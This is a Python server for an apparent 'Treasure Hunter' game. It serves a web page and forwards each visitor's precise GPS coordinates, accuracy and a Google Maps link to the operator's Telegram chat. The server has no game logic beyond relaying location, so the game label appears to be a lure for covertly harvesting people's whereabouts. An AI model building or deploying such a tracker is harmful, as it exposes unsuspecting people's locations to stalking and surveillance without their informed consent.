import json
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


# =========================
# CONFIG
# =========================

BASE_DIR = Path(__file__).resolve().parent
CONFIG_FILE = BASE_DIR / "config.json"
PUBLIC_DIR = BASE_DIR / "public"


with open(CONFIG_FILE, "r", encoding="utf-8") as f:
    CONFIG = json.load(f)


TELEGRAM = CONFIG["telegram"]
SERVER = CONFIG["server"]
GAME = CONFIG["game"]

BOT_TOKEN = TELEGRAM["bot_token"]
CHAT_ID = str(TELEGRAM["chat_id"])

HOST = SERVER["host"]
PORT = int(SERVER["port"])

TELEGRAM_API = (
    f"https://api.telegram.org/bot{BOT_TOKEN}"
)


# =========================
# TELEGRAM
# =========================

def telegram(method, data):

    body = urllib.parse.urlencode(
        data
    ).encode("utf-8")

    request = urllib.request.Request(
        f"{TELEGRAM_API}/{method}",
        data=body,
        method="POST"
    )

    with urllib.request.urlopen(
        request,
        timeout=20
    ) as response:

        return json.loads(
            response.read().decode("utf-8")
        )


# =========================
# HTTP SERVER
# =========================

class Handler(BaseHTTPRequestHandler):

    def send_bytes(
        self,
        status,
        content,
        content_type
    ):

        self.send_response(status)

        self.send_header(
            "Content-Type",
            content_type
        )

        self.send_header(
            "Cache-Control",
            "no-store"
        )

        self.send_header(
            "Access-Control-Allow-Origin",
            "*"
        )

        self.send_header(
            "Access-Control-Allow-Headers",
            "Content-Type"
        )

        self.send_header(
            "Access-Control-Allow-Methods",
            "GET, POST, OPTIONS"
        )

        self.end_headers()

        self.wfile.write(content)


    def send_json(
        self,
        status,
        data
    ):

        body = json.dumps(
            data,
            ensure_ascii=False
        ).encode("utf-8")

        self.send_bytes(
            status,
            body,
            "application/json; charset=utf-8"
        )


    # =========================
    # OPTIONS
    # =========================

    def do_OPTIONS(self):

        self.send_response(204)

        self.send_header(
            "Access-Control-Allow-Origin",
            "*"
        )

        self.send_header(
            "Access-Control-Allow-Headers",
            "Content-Type"
        )

        self.send_header(
            "Access-Control-Allow-Methods",
            "GET, POST, OPTIONS"
        )

        self.end_headers()


    # =========================
    # GET
    # =========================

    def do_GET(self):

        # Health check
        if self.path == "/health":

            self.send_json(
                200,
                {
                    "ok": True,
                    "service": "Treasure Hunter",
                    "status": "running"
                }
            )

            return


        parsed = urllib.parse.urlparse(
            self.path
        )

        path = parsed.path


        if path == "/":
            path = "/index.html"


        file_path = (
            PUBLIC_DIR /
            path.lstrip("/")
        ).resolve()


        # جلوگیری از دسترسی به فایل‌های بیرون public
        try:

            file_path.relative_to(
                PUBLIC_DIR.resolve()
            )

        except ValueError:

            self.send_json(
                403,
                {
                    "ok": False,
                    "error": "Forbidden"
                }
            )

            return


        if not file_path.is_file():

            self.send_json(
                404,
                {
                    "ok": False,
                    "error": "File not found"
                }
            )

            return


        content_types = {

            ".html":
                "text/html; charset=utf-8",

            ".css":
                "text/css; charset=utf-8",

            ".js":
                "application/javascript; charset=utf-8",

            ".json":
                "application/json; charset=utf-8",

            ".png":
                "image/png",

            ".jpg":
                "image/jpeg",

            ".jpeg":
                "image/jpeg",

            ".svg":
                "image/svg+xml",

            ".ico":
                "image/x-icon"
        }


        content_type = content_types.get(
            file_path.suffix.lower(),
            "application/octet-stream"
        )


        self.send_bytes(
            200,
            file_path.read_bytes(),
            content_type
        )


    # =========================
    # LOCATION
    # =========================

    def do_POST(self):

        if self.path != "/location":

            self.send_json(
                404,
                {
                    "ok": False,
                    "error": "Endpoint not found"
                }
            )

            return


        try:

            length = int(
                self.headers.get(
                    "Content-Length",
                    "0"
                )
            )


            raw = self.rfile.read(
                length
            )


            data = json.loads(
                raw.decode("utf-8")
            )


            latitude = float(
                data["latitude"]
            )

            longitude = float(
                data["longitude"]
            )

            accuracy = float(
                data.get(
                    "accuracy",
                    0
                )
            )


            # اعتبارسنجی مختصات

            if not (
                -90 <= latitude <= 90
            ):

                raise ValueError(
                    "Invalid latitude"
                )


            if not (
                -180 <= longitude <= 180
            ):

                raise ValueError(
                    "Invalid longitude"
                )


            # =========================
            # SEND LOCATION
            # =========================

            location_result = telegram(
                "sendLocation",
                {
                    "chat_id": CHAT_ID,
                    "latitude": latitude,
                    "longitude": longitude
                }
            )


            if not location_result.get(
                "ok"
            ):

                raise RuntimeError(
                    location_result.get(
                        "description",
                        "Telegram error"
                    )
                )


            # =========================
            # GOOGLE MAPS
            # =========================

            maps_url = (
                "https://www.google.com/maps/"
                "search/?api=1&query="
                f"{latitude},{longitude}"
            )


            # =========================
            # MESSAGE
            # =========================

            message = (

                "📍 <b>Treasure Hunter</b>\n\n"

                f"Latitude: "
                f"<code>{latitude:.6f}</code>\n"

                f"Longitude: "
                f"<code>{longitude:.6f}</code>\n"

                f"Accuracy: "
                f"<code>{accuracy:.1f} m</code>\n\n"

                f'<a href="{maps_url}">'
                "🗺 Google Maps"
                "</a>"
            )


            message_result = telegram(
                "sendMessage",
                {
                    "chat_id": CHAT_ID,
                    "text": message,
                    "parse_mode": "HTML"
                }
            )


            if not message_result.get(
                "ok"
            ):

                raise RuntimeError(
                    message_result.get(
                        "description",
                        "Telegram message error"
                    )
                )


            print(
                "[LOCATION]",
                f"{latitude:.6f},",
                f"{longitude:.6f}",
                f"accuracy={accuracy:.1f}m"
            )


            self.send_json(
                200,
                {
                    "ok": True,
                    "latitude": latitude,
                    "longitude": longitude,
                    "accuracy": accuracy
                }
            )


        except Exception as error:

            print(
                "[ERROR]",
                repr(error)
            )


            self.send_json(
                500,
                {
                    "ok": False,
                    "error": str(error)
                }
            )


# =========================
# START
# =========================

print("")
print("======================================")
print("       TREASURE HUNTER SERVER")
print("======================================")
print("")
print(
    f"🌐 http://127.0.0.1:{PORT}"
)
print(
    f"📍 GPS radius: "
    f"{GAME['treasure_radius']}m"
)
print(
    f"🎯 GPS accuracy target: "
    f"{GAME['gps_accuracy']}m"
)
print("")
print("Website + Backend: READY")
print("Waiting for GPS...")
print("")


server = ThreadingHTTPServer(
    (HOST, PORT),
    Handler
)


try:

    server.serve_forever()

except KeyboardInterrupt:

    print("")
    print("🛑 Treasure Hunter stopped.")

finally:

    server.server_close()
